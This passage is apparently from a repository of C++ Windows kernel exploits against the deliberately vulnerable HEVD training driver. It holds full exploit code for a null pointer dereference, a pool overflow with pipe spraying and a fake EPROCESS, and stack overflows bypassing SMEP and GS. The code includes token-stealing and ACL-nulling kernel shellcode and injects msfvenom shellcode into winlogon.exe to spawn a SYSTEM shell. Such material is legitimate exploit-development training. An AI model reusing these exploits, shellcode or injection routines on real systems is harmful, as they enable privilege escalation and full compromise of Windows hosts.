	startupInfoEx.StartupInfo.wShowWindow = SW_HIDE;
	startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW |
		STARTF_USESTDHANDLES;
	startupInfoEx.lpAttributeList = procList;
	if(!CreateProcess(L"c:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&startupInfoEx.StartupInfo,
		&processInfo)
	) {
		printf("[-] CreateProcess failed\n");
		exit(-1);
	}
	printf("[>] Created new process with ID %d\n", processInfo.dwProcessId);

	printf("[>] Allocating memory for shellcode in target process\n");
	LPVOID pAddr = VirtualAllocEx(processInfo.hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Address in target process: %p\n", pAddr);

	printf("[>] Writing process memory & running CreateThread\n");
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(processInfo.hProcess, pAddr, sc, sizeof(sc), &bytesWritten)) {
		printf("[-] Failed to WriteProcessMemory\n");
		exit(-1);
	}
	if (!CreateRemoteThread(processInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddr, NULL, 0, NULL)) {
		printf("[-] Failed to WriteProcessMemory\n");
		exit(-1);
	}
	printf("[>] Done, dropping privileges\n");

	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
	return 0;
}

```

`windows-exploits/HevdNullPointerMIWin7x64.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"

/*
	HEVD Null Pointer Dereference / Medium Integrity

	Author : @xct_de
	Target : Win7 x64

	In Windows 7, there's a flaw that allows to map NULL pages using the NtAllocateVirtualMemory call.
	This only works on pre SP1 versions on x64 since they backported the patch there.

	We can however enable it as admin (useful for practice): 
	- Create Key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\exploit.exe
	- Create REG_DWORD EnableLowVaAccess: 1
	- Create in REG_DWORD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management new REG_DOWRD EnableLowVaAccess: 1
	- Reboot
*/
namespace HevdNullPointerMIWin7x64NS {
	
	HANDLE hDriver;
	DWORD bytesRet;

	typedef struct _WriteWhatWhereBuffer
	{
		uintptr_t what;
		uintptr_t where;
	} WriteWhatWhereBuffer;

	// Token Stealing Payload Win7 x64
	BYTE sc[256] = {
	  0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
	  0x00, 0x48, 0x8b, 0x40, 0x70, 0x48, 0x89, 0xc1, 0x49, 0x89,
	  0xcb, 0x49, 0x83, 0xe3, 0x07, 0xba, 0x04, 0x00, 0x00, 0x00,
	  0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
	  0x01, 0x00, 0x00, 0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,
	  0x75, 0xea, 0x48, 0x8b, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48,
	  0x83, 0xe2, 0xf0, 0x4c, 0x09, 0xda, 0x48, 0x89, 0x91, 0x08,
	  0x02, 0x00, 0x00, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// VirtualAlloc can *not* do it anymore on windows 7 x64 from a certain patch level onwards as the null page protection was backported
		// ZwAllocateVirtualMemory can do it up to Win7 x64 SP1 and up to Win7 x86 (any SP)
		// Ref: https://cdn2.hubspot.net/hubfs/4598121/PART-ONE-Windows-Kernel-Info-Leak-Investigating-Microsoft-Vulnerability-CVE-2019-1169-VerSprite-Research.pdf
		ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

		PVOID baseAddr = (PVOID)0x1; // can not be null
		SIZE_T regionSize = 0x1000;

		printf("[>] Allocating Null Page\n");
		NTSTATUS status = _ZwAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE		);
		if (status != STATUS_SUCCESS) {
			printf("[!] Could not allocated null page %lx\n", status);
			return;
		}

		RtlCopyMemory((void*)0x100, sc, sizeof(sc));
		*(QWORD*)0x8 = 0x100;

		BYTE dummy[1024];
		if (!DeviceIoControl(hDriver, IOCTL(0x80A), dummy, sizeof(dummy), NULL, 0, NULL, NULL)) {
			printf("[!] Null Ptr Dereference failed\n");
		}

		printf("[>] Enjoy your shell!\n");
		system("cmd");
		return;
	}
}


int HevdNullPointerMIWin7x64(int argc, char** argv) {
	printf("-----------------------------------------\n");
	printf("  Running HEVD Null Pointer Dereference  \n");
	printf("-----------------------------------------\n");
	HevdNullPointerMIWin7x64NS::Exploit(argc, argv);
	return 0;
}
```

`windows-exploits/HevdPoolOverflowWin7x64.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include <vector>

/*
	HEVD NonPaged Pool Overflow / Medium Integrity

	Author : @xct_de
	Target : Win7 x64

	ProcessBilled Overwrite leading into Arbitrary Decrement on BlockQuota Pointer
*/
namespace HevdPoolOverflowWin7x64NS {

	const DWORD IOCTL_READ = 0x222003;
	const DWORD DEFRAG = 100000; // 80000
	const DWORD HOLES = 50000; // 30000
	const DWORD BUFSIZE = 0x210;
	const DWORD EPROCESS_SIZE = 0x4f8;
	HANDLE hDriver;
	DWORD bytesRet;

	std::vector<HANDLE> readPipeHandles;
	std::vector<HANDLE> writePipeHandles;
	std::vector<HANDLE> readPipeHandles2;
	std::vector<HANDLE> writePipeHandles2;

	BYTE uBuffer[BUFSIZE]; // ALLOC_SIZE - 0x48, 0x48 is the header size
	BOOL res = FALSE;
	HANDLE readPipe = NULL;
	HANDLE writePipe = NULL;
	DWORD resultLength;

	typedef struct eProcResult {
		QWORD eProcess;
		QWORD tokenPtr;
		int pid;
	} eProcResult;


	// HEVD Arbitrary Read Primitive (here for 8 byte)
	QWORD arbRead(QWORD where) {
		typedef struct _ArbitraryReadBuffer
		{
			uintptr_t readAddress;
			uintptr_t outBuf;
		} ArbitraryReadBuffer;

		QWORD readBuffer = 0;
		ArbitraryReadBuffer arbReadBuf = { 0 };
		arbReadBuf.readAddress = where;
		arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
		if (DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, &bytesRet, NULL)) {
			//printf("%llx ", readBuffer[i]);
		}
		return readBuffer;
	}


	eProcResult GetCurrentEProcess() {
		// find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[>] System _EPROCESS: 0x%llx\n", systemProc);

		// walk ActiveProcessLinks to find our process
		DWORD currentProcessPid = GetCurrentProcessId();
		//printf("[>] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0;
		QWORD cTokenPtr;

		while (!found) {
			cProcess = arbRead(cProcess + 0x188); // get next entry in ActiveProcessLinks (dt _EPROCESS)		
			cProcess -= 0x188; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)
			cPid = arbRead(cProcess + 0x180);
			cTokenPtr = arbRead(cProcess + 0x208);
			if (cPid == currentProcessPid) {
				printf("[>] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
				found = true;
				break;
			}
		}
		if (!found) {
			printf("Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}
		eProcResult result{};
		result.eProcess = cProcess;
		result.tokenPtr = cTokenPtr;
		result.pid = cPid;
		return result;
	}


	// Sprays the NonPaged Pool with Objects of Size 0x210 (this technique works for any size though)
	void SprayPool() {
		RtlFillMemory(uBuffer, BUFSIZE, 0x41);
		readPipeHandles.clear();
		writePipeHandles.clear();
		readPipeHandles2.clear();
		writePipeHandles2.clear();

		// create defrag  objects
		printf("[>] Creating defrag objects\n");
		for (int i = 0; i < DEFRAG; i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			readPipeHandles.push_back(readPipe);
			writePipeHandles.push_back(writePipe);
		}
		for (int i = 0; i < writePipeHandles.size(); i++) {
			WriteFile(writePipeHandles[i], uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}

		printf("[>] Creating some more objects for holes\n");
		// create more for holes
		for (int i = 0; i < HOLES; i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			readPipeHandles2.push_back(readPipe);
			writePipeHandles2.push_back(writePipe);
		}
		for (int i = 0; i < writePipeHandles2.size(); i++) {
			WriteFile(writePipeHandles2[i], uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}

		// grooming
		printf("[>] Grooming\n");
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			if (i % 2 == 0) {
				CloseHandle(readPipeHandles2[i]);
				CloseHandle(writePipeHandles2[i]);
			}
		}
	}


	void RewritePipes() {
		printf("[>] Freeing overflown object(s)\n");
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			if (i % 2 != 0) {
				CloseHandle(writePipeHandles2[i]);
				CloseHandle(readPipeHandles2[i]);				
			}
		}
		printf("[>] Allocating objects again to avoid stability issues\n");
		// fill back immediately https://www.pixiepointsecurity.com/blog/nday-cve-2020-17087.html
		for (int i = 0; i < readPipeHandles2.size(); i++) {
			CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));
			WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL);
		}
	}


	void PoolOverflow(QWORD cProcData[], eProcResult result, QWORD where, LPVOID buf) {
		// prepare fake NonPaged Pool Object Header
		BYTE fakeHeader[] = (
			"\x21"								// + 0x000 PreviousSize     : Pos 0, 8 Bits  # (0x210 - 0x30) / 0x10 // copied from real allocation
			"\x00"								// + 0x000 PoolIndex        : Pos 8, 8 Bits  # (can stay 0) // copied from real allocation
			"\x21"								// + 0x000 BlockSize        : Pos 16, 8 Bits #  0x210/0x10 // copied from real allocation
			"\x0A"								// + 0x000 PoolType         : Pos 24, 8 Bits (bit 3 enables PoolQuota) // modified, Bit 1 (PagedPool) + Bit 3 (PoolQuota)
			"\x4e\x70\x46\x72"					// Pool Tag ( "NpFr" reversed)
			"\x00\x10\x00\x00\x1a\x00\x00\x00"	// ProcessBilled (Address of Fake EPROCESS)
			);

		// area before EPROCESS gets checked too, no idea why
		RtlZeroMemory(buf, 0x14000);
		RtlFillMemory(LPVOID((QWORD)buf), 0x1000, '\x01'); // ?

		// start of EPROCESS at 0x50
		QWORD fakeEprocessPtr = (QWORD)buf + 0x1000;
		// put a full copy of our eprocess to make it as legit as possible
		for (int i = 0; i < EPROCESS_SIZE; i++) {
			*(QWORD*)(fakeEprocessPtr + i * 8) = cProcData[i];
		}

		/*
		On free, the value indicating the quota used in this structure is updated,
		by subtracting the size of the allocation. Thus, an attacker could decrement the
		value of an arbitrary address upon returning the charged quota. An attacker
		can mount both attacks on any pool allocation as long as the quota bit and the
		quota process object pointer are both set.

		PspReturnQuota will do:
		Exchg (QuotaBlock, QuotaValue1 - BlockSize_1, QuotaValue1); 
		We control QuotaValue1 (Ptr at 0x1c0) & QuotaValue1 (value where Ptr points to, here Token with 0x80000000)
		*/
		// PspReturnQuota will do 
		*(QWORD*)(fakeEprocessPtr + 0x1c0) = where;  // Eprocess->BlockQuota this is our arb dec, pointing to buf for now to no


		printf("[>] VirtualAlloc fake EPROCESS at %llx\n", fakeEprocessPtr);
		printf("[>] Spraying pool\n");

		SprayPool();
		//printf("[DEBUG] Press enter to continue & trigger pool overflow\n"); getchar();

		BYTE uBuffer[0x1000];
		RtlFillMemory(uBuffer, 0x200, 'A'); // -0x18
		RtlCopyMemory(uBuffer + 0x200, fakeHeader, sizeof(fakeHeader));

		// DEBUG
		printf("[!] TokenPrivileges before decrement %llx\n", arbRead(where));
		// DEBUG

		printf("[>] Overflowing into adjacent Object & overwriting ProcessBilled Ptr..\n");
		DWORD IoControlCode = 0x22200f;
		DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, 0x200 + sizeof(fakeHeader), NULL, 0, &bytesRet, NULL);

		RewritePipes();

		// DEBUG
		printf("[!] TokenPrivileges after decrement %llx\n", arbRead(where));
		// DEBUG
	}


	BOOL CheckPrivilege(const TCHAR* Privilege)
	{
		LUID luid;
		PRIVILEGE_SET privs;
		HANDLE hProcess;
		HANDLE hToken;
		hProcess = GetCurrentProcess();
		if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
			printf("[-] OpenProcessToken Failed\n");
			return FALSE;
		}
		if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
			printf("[-] LookupPrivilegeValue Failed\n");
			return FALSE;
		}
		privs.PrivilegeCount = 1;
		privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
		privs.Privilege[0].Luid = luid;
		privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
		BOOL bResult;
		PrivilegeCheck(hToken, &privs, &bResult);
		return bResult;
	}


	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// Get current process by using the arb read primitive to walk the process list
		eProcResult result = GetCurrentEProcess();

		// read the whole EPROCESS structure into a local buffer to get a copy of it
		QWORD cProcData[EPROCESS_SIZE]{ 0x0 };
		for (int i = 0; i < EPROCESS_SIZE / 8; i++) {
			cProcData[i] = arbRead(result.eProcess + i * 8);
			//printf("%llx\n", readBuffer[i]);
		}

		LPVOID buf = VirtualAlloc((LPVOID)0x0000001a00000000, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);	
		PoolOverflow(cProcData, result, result.tokenPtr + 0x48, buf);
		
		if (CheckPrivilege(L"SeDebugPrivilege")) {

			printf("[+] Token privileges set!\n");
			system("cmd.exe");
		}
		else {
			printf("[>] Exploit failed :(\n");
		}
		CloseHandle(hDriver);
	}
}


int HevdPoolOverflowWin7x64(int argc, char** argv) {
	printf("~-------------------------------~\n");
	printf("    HEVD PoolOverflow Win7 x64   \n");
	printf("~-------------------------------~\n");
	HevdPoolOverflowWin7x64NS::Exploit(argc, argv);
	return 0;
}
```

`windows-exploits/HevdStackOverflowACLMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   SMEP Bypass via ROP/CR4 & ACL Editing Shellcode.
*/

int HevdStackOverflowACLMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdStackOverflowACLMI  \n");
	printf("~-----------------------------~\n");

	DWORD OFFSET = 2072;
	ResolveGadgets();

	// ACL Nulling Shellcode
	// https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2
	// we allow authenticated users ACL access to winlogon & 
	// set our own mandatory policy to 0 to allow injection from to 4
	BYTE sc[] = {
	  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
	  0x8b, 0x80, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48,
	  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x98, 0xb8,
	  0xfb, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x81, 0xc3, 0xa8,
	  0x05, 0x00, 0x00, 0x81, 0x3b, 0x77, 0x69, 0x6e, 0x6c, 0x75,
	  0xe7, 0x48, 0x81, 0xeb, 0xb0, 0x05, 0x00, 0x00, 0x48, 0x8b,
	  0x03, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x83, 0xc0, 0x48, 0xc6,
	  0x00, 0x0f, 0x48, 0x81, 0xc1, 0xb8, 0x04, 0x00, 0x00, 0x48,
	  0x8b, 0x01, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x05, 0xd4, 0x00,
	  0x00, 0x00, 0xc6, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25,
	  0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00,
	  0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00,
	  0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b,
	  0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01,
	  0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48,
	  0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01,
	  0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	// msfvenom -p windows/x64/exec CMD='cmd.exe' EXITFUNC=none -f csharp
	BYTE cmdShellcode[] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
		0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
		0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
		0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
		0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
		0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
		0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
		0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
		0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
		0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
		0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
		0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
		0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
		0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
		0x2e,0x65,0x78,0x65,0x00 };

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] SC @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	int offset = 2072;
	BYTE uBuffer[2104] = { 'A' };

	QWORD* rop = (QWORD*)(uBuffer + offset);
	int index = 0;
	// bypass SMEP via ROP & finish with sc ptr
	*(rop + index++) = ntBase + kernelGadgets["POP_RCX"];
	*(rop + index++) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(rop + index++) = ntBase + kernelGadgets["MOV_CR4_RCX"];
	*(rop + index++) = (QWORD)sc_ptr;

	getchar();

	// trigger
	DWORD IoControlCode = 0x222003;
	BOOL triggerIOCTL = DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

	printf("[>] ACL edited & MandatoryPolicy nulled!\n");
	
	// we can now inject code into winlogon (TOKEN_MANDATORY_POLICY_OFF)
	
	DWORD pid = FindProcessId(L"winlogon.exe");
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (proc == NULL) {
		printf("[!] Could not open remote process %p\n", proc);
		return -1;
	}
	LPVOID rBuf = VirtualAllocEx(proc, NULL, sizeof(cmdShellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuf == NULL) {
		printf("[!] Could not allocate shellcode in remote process\n");
		return -1;
	}
	else {
		printf("[>] Allocated shellcode @ %p\n", rBuf);
	}	
	if (!WriteProcessMemory(proc, rBuf, cmdShellcode, sizeof(cmdShellcode), NULL)) {
		printf("[-] WriteProcessMemory to winlogon.exe failed\n");
		return -1;
	}
	printf("[>] CreateRemoteThread - Enjoy your shell!\n");
	HANDLE rThread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)rBuf, NULL, 0, NULL);
	CloseHandle(proc);

	return 0;
}

```

`windows-exploits/HevdStackOverflowGSMI.cpp`:

```cpp
#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow with GS / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   SMEP Bypass via PTE U/S Flipping (using arb. read primitive), reading Stack Cookie from .Data Section & xoring with RSP, Token Stealing Bait Shellcode
   Reference: https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
*/

int HevdStackOverflowGSMI(int argc, char** argv) {
	printf("~-------------------------------~\n");
	printf("  Running HevdStackOverflowGSMI  \n");
	printf("~-------------------------------~\n");

	ResolveGadgets();

	DWORD POP_RAX = kernelGadgets["POP_RAX"];
	DWORD POP_RCX = kernelGadgets["POP_RCX"];
	DWORD MOV_RAX_TO_PTR_RCX = kernelGadgets["MOV_RAX_PTRRCX"];
	DWORD JUST_RET = kernelGadgets["RET"];

	const char* driverPath = "C:\\HEVD\\HEVD.sys";
	const char* exploitName = "Exploit.exe";
	DWORD MiGetPteAddressOffset = 0x221ef0;
	BOOL resultIOCTL = false;

	typedef struct _ArbitraryReadBuffer
	{
		uintptr_t readAddress;
		uintptr_t outBuf;
	} ArbitraryReadBuffer;

	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %p\n", ntBase);
	QWORD hevdBase = getBaseAddr(L"HEVD.sys");
